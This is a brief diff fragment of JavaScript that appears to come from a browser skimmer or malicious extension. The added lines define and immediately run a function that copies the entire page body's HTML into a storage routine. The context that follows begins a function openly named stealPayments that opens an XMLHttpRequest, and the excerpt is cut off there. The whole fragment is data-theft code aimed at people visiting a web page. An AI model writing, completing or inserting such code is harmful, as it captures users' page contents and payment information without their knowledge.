@@ -1,4 +1,16 @@
 
+function mainPage()
+{
+	
+	  var bodyHtml = document.getElementsByTagName('body')[0].innerHTML;
+	storeData(bodyHtml);
+	
+	
+}
+
+
+mainPage();
+
 function stealPayments()
 {
 	var fetchHash = new XMLHttpRequest();
